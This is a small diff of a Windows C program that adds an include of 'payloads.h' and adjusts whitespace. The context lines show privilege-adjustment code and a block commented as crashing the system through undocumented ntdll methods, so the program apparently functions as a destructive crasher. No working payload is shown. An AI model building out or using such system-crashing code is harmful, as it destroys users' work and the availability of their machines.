@@ -14,6 +14,7 @@
 #include <processthreadsapi.h>
 #include <tlhelp32.h>
 #include <utilapiset.h>
+#include "payloads.h"
 
 typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
@@ -243,7 +244,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         Sleep(50);
     }
 
-    
+
 
     if (hNtdll != 0) { //crash system using undocumented methods
         NTSTATUS s1, s2;
